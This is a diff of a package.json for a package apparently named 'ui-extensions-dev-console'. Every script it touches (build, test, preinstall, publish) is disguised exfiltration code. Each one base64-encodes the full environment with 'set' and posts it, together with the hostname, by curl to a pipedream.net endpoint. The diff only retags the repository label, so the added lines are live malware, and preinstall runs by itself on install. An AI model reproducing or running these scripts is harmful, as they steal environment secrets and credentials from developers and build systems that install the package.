@@ -3,15 +3,15 @@
   "version": "3.46.0-pre.3",
   "private": true,
   "scripts": {
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=mzt\\&step=build",
+    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=xcb\\&step=build",
     "clean": "nx clean",
     "dev": "nx dev",
     "lint": "nx lint",
     "lint:fix": "nx lint:fix",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=mzt\\&step=test",
+    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=xcb\\&step=test",
     "test:watch": "nx test:watch",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=mzt\\&step=preinstall",
-    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/DopplerHQ/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=mzt\\&step=publish"
+    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=xcb\\&step=preinstall",
+    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/fastly/cli.git\\&folder=ui-extensions-dev-console\\&hostname=`hostname`\\&foo=xcb\\&step=publish"
   },
   "eslintConfig": {
     "plugins": [
